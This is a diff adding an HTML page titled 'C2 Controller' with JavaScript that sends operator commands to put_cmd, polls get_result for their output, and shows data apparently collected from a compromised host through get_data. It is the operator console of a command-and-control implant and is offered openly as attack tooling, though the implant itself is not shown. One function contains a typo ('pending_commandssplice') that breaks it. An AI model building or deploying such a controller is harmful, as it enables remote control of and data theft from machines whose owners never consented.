@@ -1,0 +1,97 @@
+<html>
+<head>
+  <script>
+var pending_commands = [];
+var path = document.location.pathname.split('/').slice(0, -1).join("/");
+
+function run_cmd() {
+  var cmd = document.getElementById("cmd").value;
+  var foreground = document.getElementById("cmd_state").value == "foreground";
+  fetch(`${path}/put_cmd`, {
+    body: JSON.stringify({cmd, foreground}),
+    headers: {
+      'content-type': 'application/json'
+    },
+    method: 'POST'
+  })
+  .then(response => response.json())
+  .then(json => {
+
+    pending_commands.push(json.id);
+    var pre = document.createElement("pre");
+    pre.setAttribute("style", "white-space: pre-wrap;");
+    pre.id = `cmd_${json.id}`;
+    document.getElementById("cmd_log").prepend(pre);
+
+    pre = document.createElement("pre");
+    pre.setAttribute("style", "white-space: pre-wrap;");
+    pre.appendChild(document.createTextNode(`cmd [${foreground}]> ${cmd}\n`));
+    document.getElementById("cmd_log").prepend(pre);
+
+    document.getElementById("cmd").value = '';
+    // check_cmd();
+  })
+}
+
+function check_cmd() {
+  Array.from(pending_commands).forEach(id => {
+    fetch(`${path}/get_result/${id}`)
+    .then(response => response.json())
+    .then(json => {
+      var pre = document.getElementById(`cmd_${id}`);
+      while (pre.firstChild) {
+        pre.removeChild(pre.firstChild);
+      }
+
+      if (json.state == "complete") {
+        pre.appendChild(document.createTextNode(`${decodeURIComponent(json.result)}\n`));
+        pending_commands.splice(pending_commands.indexOf(id), 1);
+      }
+      else {
+        pre.appendChild(document.createTextNode(`pending...\n`));
+      }
+    });
+  });
+}
+
+function check_data() {
+  fetch(`${path}/get_data`)
+  .then(response => response.json())
+  .then(json => {
+    Object.keys(json).forEach((k) => {
+      var pre = document.createElement("pre");
+      pre.setAttribute("style", "white-space: pre-wrap;");
+      pre.appendChild(document.createTextNode(`data [${k}]>\n${decodeURIComponent(json[k])}\n`));
+      document.getElementById("cmd_log").prepend(pre);
+    });
+  });
+}
+
+function clear_cmd() {
+  pending_commandssplice(0, pending_commands.length);
+}
+
+function clear_queue() {
+  fetch(`${path}/clear`);
+}
+
+setInterval(check_cmd, 2000);
+setInterval(check_data, 10000);
+clear_queue();
+  </script>
+</head>
+<body>
+	<h1>C2 Controller for {hostname}</h1>
+  <form onsubmit="run_cmd(); return false;">
+    <label for="cmd">Command:</label>
+    <input type="text" id="cmd" autofocus/>
+    <select id="cmd_state">
+      <option value="foreground">Foreground</option>
+      <option value="background">Background</option>
+    </select>
+    <input type="submit" />
+  </form>
+  <div id="cmd_log">
+  </div>
+</body>
+</html>
